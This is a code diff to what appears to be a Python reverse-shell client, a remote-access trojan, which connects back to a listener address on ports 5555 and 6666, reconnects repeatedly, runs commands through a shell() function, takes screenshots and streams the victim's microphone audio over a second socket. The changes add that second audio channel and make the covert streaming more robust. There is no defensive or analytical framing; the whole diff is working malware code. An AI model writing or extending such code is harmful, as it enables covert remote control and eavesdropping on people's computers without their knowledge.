@@ -54,10 +54,12 @@ def connection():
         time.sleep(5)  # Wait for 5 seconds before reconnecting (for resilience)
         try:
             # Connect to a remote host with Listener IP and port 5555
-            s.connect(('192.168.210.143', 5555))
+            s.connect(('192.168.56.101', 5555))
+            a.connect(('192.168.56.101', 6666))
             # Once connected, enter the shell() function for command execution
             shell()
             # Close the connection when done
+            a.close()
             s.close()
             break
         except:
@@ -145,11 +147,13 @@ def stream_audio(sock, flag):
     p = pyaudio.PyAudio()
     stream = p.open(format=FORMAT, channels=CHANNELS,
                     rate=RATE, input=True, frames_per_buffer=CHUNK)
-
     try:
         while flag['on']:
-            data = stream.read(CHUNK)
-            sock.sendall(data)
+            data = stream.read(CHUNK, exception_on_overflow=False)
+            try:
+                sock.sendall(data)
+            except BrokenPipeError:
+                flag['on'] = False  # Stop streaming if socket breaks
     except:
         pass
     finally:
@@ -223,14 +227,11 @@ def shell():
         elif command == 'listening_start':
             if not streaming_flag['on']:
                 streaming_flag['on'] = True
-                stream_thread = threading.Thread(target=stream_audio, args=(s, streaming_flag))
+                stream_thread = threading.Thread(target=stream_audio, args=(a, streaming_flag,))
                 stream_thread.start()
-            reliable_send("[*] Audio stream started.")
         elif command == 'listening_stop':
             streaming_flag['on'] = False
-            if stream_thread:
-                stream_thread.join()
-            reliable_send("[*] Audio stream stopped.")
+            stream_audio(a,streaming_flag)
         elif command == 'screenshot':
             # If the command is 'screenshot', take a screenshot and send it
             screenshot_data = take_screenshot()
@@ -255,6 +256,6 @@ def shell():
 
 # Create a socket object for communication over IPv4 and TCP
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
+a = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 # Start the connection process by calling the connection() function
 connection()
